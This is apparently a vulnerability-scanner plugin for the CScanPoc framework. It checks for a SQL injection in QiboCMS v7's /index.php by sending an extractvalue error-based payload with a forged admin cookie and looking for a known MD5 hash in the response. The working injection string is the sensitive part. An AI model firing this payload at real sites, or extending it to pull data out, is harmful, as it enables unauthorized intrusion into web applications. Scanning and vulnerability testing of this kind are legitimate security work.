# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0007'  # 平台漏洞编号，留空
    name = '齐博CMS v7整站系统 /index.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-03-13'  # 漏洞公布时间
    desc = '''
        齐博CMS前身是龙城于大学期间也即2003年所创建的PHP168网站管理系统，它是国内主流CMS系统之一，曾多次被新浪网、腾讯网、凤凰网等多家大型IT媒体报道。齐博CMS目前已有数以万计的用户在使用，覆盖政府、 企业、科研教育和媒体等各个领域。
        齐博CMS v7整站系统 /index.php SQL注入漏洞
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '95e46669-4251-4f4f-9088-698d058a0259'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/index.php?jobs=show&label_hf[1%27%20and%20extractvalue(1,concat(0x5c,md5(3.1415)))%23][2]=asd'
            header = {
                "Cookie": 'admin=1'
            }
            target = arg + payload
            req = requests.get(target, headers=header)

            if req.status_code == 200:
                m = re.search('63e1f04640e83605c1d177544a5a0488', req.text)
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
